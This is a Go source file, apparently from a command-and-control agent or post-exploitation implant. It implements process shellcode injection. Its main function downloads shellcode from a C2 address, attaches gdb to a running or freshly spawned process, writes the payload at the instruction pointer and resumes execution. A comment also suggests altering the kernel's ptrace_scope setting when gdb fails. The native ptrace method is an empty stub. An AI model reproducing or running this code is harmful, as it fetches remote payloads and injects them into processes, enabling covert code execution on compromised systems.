package agent

import (
	"fmt"
	"io/ioutil"
	"os/exec"
	"strconv"
	"strings"
)

// gdbInjectShellcode inject shellcode to a running process using GDB
// start a `sleep` process and inject to it if pid == 0
// modify /proc/sys/kernel/yama/ptrace_scope if gdb does not work
// gdb command: set (char[length])*(int*)$rip = { 0xcc }
func gdbInjectShellcode(pid int) error {
	if pid == 0 {
		cmd := exec.Command("sleep", "10")
		err := cmd.Start()
		if err != nil {
			return err
		}
		pid = cmd.Process.Pid
	}
	shellcodeFile := AgentRoot + "/shellcode.txt"
	err := DownloadViaCC(CCAddress+"shellcode.txt", shellcodeFile)
	if err != nil {
		return err
	}
	shellcode, err := ioutil.ReadFile(shellcodeFile)
	if err != nil {
		return err
	}
	shellcodeLen := strings.Count(string(shellcode), "0x")

	out, err := exec.Command(UtilsPath+"/gdb", "-q", "-ex", fmt.Sprintf("set (char[%d]*(int*)$rip={%s})", shellcodeLen, shellcode), "-ex", "c", "-ex", "q", "-p", strconv.Itoa(pid)).CombinedOutput()
	if err != nil {
		return fmt.Errorf("GDB failed (shellcode length %d): %s\n%v", shellcodeLen, out, err)
	}

	return nil
}

// goInjectShellcode pure go, using ptrace
func goInjectShellcode(pid int) error {
	return nil
}

// InjectShellcode inject shellcode to a running process using various methods
func InjectShellcode(pid int, method string) (err error) {
	switch method {
	case "gdb":
		err = gdbInjectShellcode(pid)
	case "native":
		err = goInjectShellcode(pid)
	default:
		err = fmt.Errorf("%s is not supported", method)
	}
	return
}
